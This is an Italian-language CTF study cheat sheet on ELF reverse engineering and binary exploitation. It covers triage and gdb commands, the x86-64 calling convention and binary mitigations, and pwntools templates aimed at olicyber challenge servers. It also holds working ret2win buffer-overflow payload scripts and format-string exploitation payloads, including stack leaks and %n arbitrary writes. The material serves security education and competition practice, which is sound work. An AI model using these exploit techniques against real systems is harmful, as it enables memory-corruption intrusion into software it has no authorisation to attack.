# 05. Software Security & Binary Analysis (Rev + Pwn Base)

> [!abstract] Triage Binario ELF (Primi 60 Secondi)
> 1. **Identifica tipo e architettura**: `file ./bin` (32/64-bit, dynamically vs statically linked, stripped vs not stripped).
> 2. **Cerca stringhe leggibili**: `strings -n 5 ./bin | grep -iE "flag|pass|correct|win"`.
> 3. **Controlla le mitigazioni**: `checksec --file=./bin` (`NX`, `Canary`, `PIE`, `RELRO`).
> 4. **Esegui e traccia chiamate**: `./bin`, `ltrace ./bin` (librerie: `strcmp`, `puts`), `strace ./bin` (syscall).
> 5. **Analisi statica / Decompilazione**: apri il binario in **Ghidra** o **Binary Ninja** (cerca `main`, `win`, `flag`, cross-reference alle stringhe).

---

## 1. Analisi Statica & Dinamica ELF (`sw01`–`sw16`)

**Trigger**: Challenge di Reverse Engineering o Pwn in cui ricevi un eseguibile Linux (ELF).

### Comandi Essenziali da Terminale

| Obiettivo | Comando | Note operative |
| :--- | :--- | :--- |
| **Tipo e architettura** | `file ./bin` | Distingue x86 (32-bit) vs x86-64 (64-bit), ARM, endianness, `stripped` (senza simboli). |
| **Stringhe interne** | `strings -t x ./bin` | Mostra le stringhe ASCII e il loro offset esadecimale; per UTF-16 aggiungi `-e l`. |
| **Simboli e funzioni** | `nm ./bin` oppure `readelf -s ./bin` | Elenca funzioni (`main`, `win`) e variabili globali se il binario non è stripped. |
| **Sezioni e header ELF** | `readelf -S ./bin` / `readelf -h ./bin` | Trova indirizzi di `.text`, `.data`, `.rodata`, `.bss` ed entry point. |
| **Disassembly veloce** | `objdump -d -M intel ./bin \| less` | Disassembla in sintassi Intel (più leggibile di AT&T). |
| **Traccia librerie a runtime** | `ltrace ./bin` | Mostra chiamate a `strcmp`, `strncmp`, `printf`, `malloc` e i loro argomenti! |
| **Traccia syscall a runtime** | `strace ./bin` | Mostra `open`, `read`, `write`, `execve` (utile per vedere file aperti dal programma). |
| **Mitigazioni binarie** | `checksec --file=./bin` | Verifica `RELRO`, `Stack Canary`, `NX`, `PIE`. |

### `gdb` + `pwndbg` (Cheat Sheet Debug)

```gdb
gdb ./bin
# --- Breakpoint & Esecuzione ---
b main                  # Breakpoint su funzione main
b *0x401234             # Breakpoint su indirizzo specifico
r                       # Run (puoi passare file in stdin: r < input.txt)
c                       # Continue fino al prossimo breakpoint
ni                      # Next Instruction (salta dentro/oltre le call? ni = step over)
si                      # Step Instruction (entra dentro le call)
fin                     # Finish: esegui fino al return della funzione corrente

# --- Ispezione Memoria & Registri ---
info functions          # Lista funzioni note
p $rax                  # Stampa valore registro (o info registers)
x/20gx $rsp             # Esamina 20 giant-word (8 byte) in hex sullo stack
x/s 0x402000            # Esamina stringa a indirizzo
x/20i $rip              # Esamina prossime 20 istruzioni
telescope $rsp 20       # (pwndbg) Mostra stack risolvendo puntatori e stringhe
cyclic 200              # (pwndbg) Genera pattern De Bruijn di 200 byte
cyclic -l 0x61616167    # (pwndbg) Calcola offset esatto dal valore letto in RSP/RIP
vmmap                   # (pwndbg) Mostra permessi (rwx) delle regioni di memoria
got / plt               # (pwndbg) Mostra indirizzi della Global Offset Table
```

---

## 2. Architettura x86-64 & Calling Convention

**Trigger**: Devi leggere assembly/Ghidra o preparare gli argomenti per chiamare una funzione in una challenge binary.

### Calling Convention System V AMD64 (Linux 64-bit)
- **Ordine dei primi 6 argomenti interi/puntatori**:
  $$\mathbf{1^\circ: \texttt{RDI}} \quad \mathbf{2^\circ: \texttt{RSI}} \quad \mathbf{3^\circ: \texttt{RDX}} \quad \mathbf{4^\circ: \texttt{RCX}} \quad \mathbf{5^\circ: \texttt{R8}} \quad \mathbf{6^\circ: \texttt{R9}}$$
  *(Dal 7° in poi sullo stack. Valore di ritorno in `RAX`.)*
- **Linux 32-bit (x86 `cdecl`)**: tutti gli argomenti vengono passati sullo **stack** in ordine inverso; valore di ritorno in `EAX`.

### Layout dello Stack (x86-64)
Lo stack cresce verso **indirizzi più bassi** (`RSP` diminuisce con `push`), ma i buffer (`char buf[64]`) si scrivono verso **indirizzi più alti**:

```text
Indirizzi Bassi  [ RSP ]  ->  buf[0] ... buf[63]   (variabili locali)
                              padding / altre var locali
                              [ Stack Canary ]     (8 byte, termina con 0x00, se attivo)
                              [ Saved RBP ]        (8 byte)
Indirizzi Alti   [ RBP+8 ] -> [ Saved RIP ]        (Return Address: 8 byte)
```

> [!warning] Stack Alignment (`movaps` crash su Ubuntu / glibc moderne)
> Su x86-64, prima di una `call`, `RSP` deve essere allineato a **16 byte**. Se salti direttamente a una funzione `win()` o `system()` e il programma va in `SIGSEGV` su un'istruzione `movaps`, inserisci un singolo gadget `ret` prima dell'indirizzo di destinazione per riallineare lo stack di 8 byte!

---

## 3. Mitigazioni Binarie (`checksec`)

| Mitigazione | Cosa protegge | Come si gestisce in CTF |
| :--- | :--- | :--- |
| **Stack Canary** | Inserisce un valore segreto tra buffer locali e `Saved RBP/RIP`; verificato prima di `ret`. | Va **letto (leak)** prima (es. con Format String `%p` o out-of-bounds read) e riscritto identico nel payload; nota che il byte meno significativo del canary è sempre `\x00`. |
| **NX (No-Execute)** | Rende lo stack **non eseguibile** (`rw-`, niente codice nello stack). | Non puoi eseguire istruzioni messe nel buffer; devi riusare codice già esistente nel binario o in `libc` (es. `ret2win`, ROP). |
| **PIE** | Randomizza gli indirizzi del codice del binario stesso ad ogni avvio (`.text`, `.data`, `win()`). | Con PIE **off**, gli indirizzi di `win()` e dei gadget sono fissi (`0x401234`). Con PIE **on**, serve prima un **leak** di un indirizzo del binario per calcolare `elf.address = leak - offset`. |
| **ASLR** (Sistema) | Randomizza indirizzi di **Stack**, **Heap** e **libc** ad ogni esecuzione. | Per usare funzioni in `libc`, serve prima un leak di una entry `GOT` (es. `puts@GOT`) per ricavare `libc.address`. |
| **RELRO** | `Partial`: la GOT è scrivibile. `Full`: la GOT è read-only dopo il caricamento. | Con `Partial RELRO` si possono sovrascrivere puntatori in GOT (es. via Format String); con `Full RELRO` no. |

---

## 4. `pwntools`: Automazione e Interazione Remota (`sw17`–`sw20`)

**Trigger**: Devi interagire velocemente via TCP (`nc host port`) o con un processo locale inviando byte raw, interi impacchettati (`p64`/`p32`) o risolvendo calcoli automatici entro pochi secondi.

### Template Base `pwntools`

```python
from pwn import *

# Imposta contesto (architettura e log)
context.binary = elf = ELF("./challenge")   # Legge automaticamente arch, endianness e simboli
context.log_level = "info"                  # Usa "debug" per vedere tutti i byte inviati/ricevuti

# Connessione locale o remota
# p = process("./challenge")
p = remote("host.olicyber.it", 13000)

# --- Ricezione ---
p.recvuntil(b"Invia un carattere:")        # Legge fino al delimitatore
line = p.recvline().decode().strip()        # Legge una riga fino a \n
data = p.recv(4)                            # Legge esattamente 4 byte

# --- Invio ---
p.send(b"raw_bytes")                        # Invia senza newline
p.sendline(b"risposta")                     # Invia con \n finale

# --- Packing / Unpacking (Little Endian automatico) ---
addr_64 = p64(0x401196)                     # int -> 8 bytes little-endian
addr_32 = p32(0x08049182)                   # int -> 4 bytes little-endian
val_64  = u64(data.ljust(8, b"\x00"))       # bytes -> int (padding a 8 byte se leak corto!)
val_32  = u32(data.ljust(4, b"\x00"))       # bytes -> int (32-bit)

# --- Risoluzione simboli dall'ELF ---
win_addr = elf.symbols["win"]               # Indirizzo della funzione win()
puts_plt = elf.plt["puts"]                  # Entry PLT
puts_got = elf.got["puts"]                  # Entry GOT

# Passa alla shell interattiva quando serve
p.interactive()
```

### Pattern Tipico Challenge Veloce (es. somma numeri in 10s - `sw17`)
```python
import re
from pwn import *

r = remote("software-17.challs.olicyber.it", 13000)
r.recvuntil(b"iniziare ...")
r.sendline(b"go")

for _ in range(10):
    r.recvuntil(b"numeri\n")
    line = r.recvline().decode()
    nums = [int(x) for x in re.findall(r"-?\d+", line)]
    r.sendlineafter(b":", str(sum(nums)).encode())

print(r.recvall(timeout=2).decode(errors="ignore"))
```

---

## 5. Buffer Overflow (Stack-Based): Meccanica & `ret2win`

**Trigger**: Il programma legge input di lunghezza non controllata (`gets`, `scanf("%s")`, `strcpy`, `read(0, buf, N)` con `N > sizeof(buf)`).

### Procedura Sistematica
1. **Verifica la vulnerabilità e le protezioni**: `checksec --file=./bin`.
2. **Trova l'offset esatto fino a `Saved RIP`** (o fino alla variabile locale target):
   - Genera un pattern unico: `cyclic 200` (in Python: `from pwn import cyclic, cyclic_find`).
   - Esegui in `gdb`: quando va in `SIGSEGV`, leggi i primi 4/8 byte in cima allo stack (`x/gx $rsp` su x86-64, o `$eip` su x86-32).
   - Calcola l'offset: `cyclic_find(valore)` (es. `offset = 72`).
3. **Costruisci il payload (`ret2win` con PIE off e senza Canary)**:
   ```python
   from pwn import *

   elf = context.binary = ELF("./vuln")
   rop = ROP(elf)
   ret_gadget = rop.find_gadget(["ret"])[0]  # Per allineamento a 16 byte su x86-64

   offset = 72
   payload = flat(
       b"A" * offset,
       ret_gadget,            # Rimuovi se non serve allineamento (es. 32-bit)
       elf.symbols["win"]     # Sovrascrive Saved RIP con win()
   )

   p = remote("TARGET", PORT)
   p.sendline(payload)
   p.interactive()
   ```

> [!tip] Se devi passare un argomento a `win(0xdeadbeef)` su x86-64
> Cerca un gadget `pop rdi; ret` con `rop.find_gadget(["pop rdi", "ret"])[0]`:
> `payload = flat(b"A" * offset, pop_rdi, 0xdeadbeef, ret_gadget, elf.symbols["win"])`
> *(In alternativa usa direttamente `rop.call("win", [0xdeadbeef])` dopo `rop.raw(b"A" * offset)`!)*

---

## 6. Format String Vulnerabilities (`printf(user_input)`)

**Trigger**: Il programma stampa direttamente la stringa fornita dall'utente senza specificatore di formato: `printf(buf);` invece di `printf("%s", buf);`.

### Perché è pericolosa?
`printf` legge gli argomenti secondo la calling convention (`RSI`, `RDX`, `RCX`, `R8`, `R9`, poi **dallo stack**) basandosi sul numero di `%` presenti nella format string. Se non ci sono argomenti reali passati a `printf`, l'utente controlla cosa leggere o scrivere in memoria tramite gli specificatori!

### Specificatori Fondamentali

| Specificatore | Azione | Uso in CTF |
| :--- | :--- | :--- |
| `%x` / `%p` | Stampa il valore (esadecimale / puntatore `0x...`) | **Information Leak**: leggi stack, **Canary**, indirizzi PIE o **libc**. |
| `%N$p` | Accesso diretto al $N$-esimo argomento sullo stack/registri | Es. `%6$p` legge il 6° parametro (spesso l'inizio del buffer `buf` stesso su x86-64!). |
| `%N$s` | Dereferenzia il $N$-esimo valore come puntatore a stringa | **Arbitrary Read**: metti un indirizzo (es. `elf.got['puts']`) nel buffer e leggine la stringa puntata. |
| `%n` | **Scrive** il numero di byte stampati finora all'indirizzo puntato | **Arbitrary Write**: modifica variabili globali, `GOT` o `Saved RIP` (`%hhn` = 1 byte, `%hn` = 2 byte). |

### Procedura Operativa

1. **Trova l'offset del tuo input sullo stack**:
   Invia un marker riconoscibile seguito da `%p`:
   ```text
   AAAAAAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p
   ```
   Cerca dove compare `0x4141414141414141`: se appare al posto 6, il tuo buffer inizia al **parametro 6** (`offset = 6`).

2. **Leak veloce di Canary / PIE / Indirizzi**:
   ```python
   # Stampa i parametri da 1 a 30 per individuare canary (finisce con 00) e indirizzi 0x55.../0x7f...
   p.sendline(b".".join(f"%{i}$p".encode() for i in range(1, 31)))
   ```

3. **Arbitrary Read (leggere una stringa o flag a un indirizzo noto `ADDR`)**:
   ```python
   # Nota: su x86-64 l'indirizzo contiene byte \x00 (es. 0x0000000000404060),
   # quindi printf si fermerebbe al null byte se metti l'indirizzo PRIMA del formato!
   # Metti PRIMA il formato con padding a 8 byte e POI l'indirizzo:
   payload = b"%7$sAAAA" + p64(0x404060)  # 8 byte di formato -> l'indirizzo finisce all'offset 6+1 = 7
   ```

4. **Arbitrary Write automatico con `pwntools`**:
   ```python
   # Sovrascrive target_addr con new_val (con offset trovato al punto 1)
   payload = fmtstr_payload(offset=6, writes={target_addr: new_val}, write_size="short")
   ```

> [!warning] Trappole comuni nella Format String
> - **Byte nulli `\x00` su 64-bit**: gli indirizzi a 64 bit hanno byte `\x00` in testa (`0x0000000000401234` in little-endian termina con `\x00\x00`). Se metti l'indirizzo all'inizio del buffer, `printf` si ferma al primo `\x00`! Metti sempre la format string **prima** (allineata a 8 byte) e gli indirizzi **in coda**.
> - **Lunghezza di `printf`**: scrivere un intero valore a 64 bit con `%n` in un colpo solo stamperebbe miliardi di caratteri bloccando la connessione; usa `write_size="byte"` (`%hhn`) o `"short"` (`%hn`) in `fmtstr_payload`.
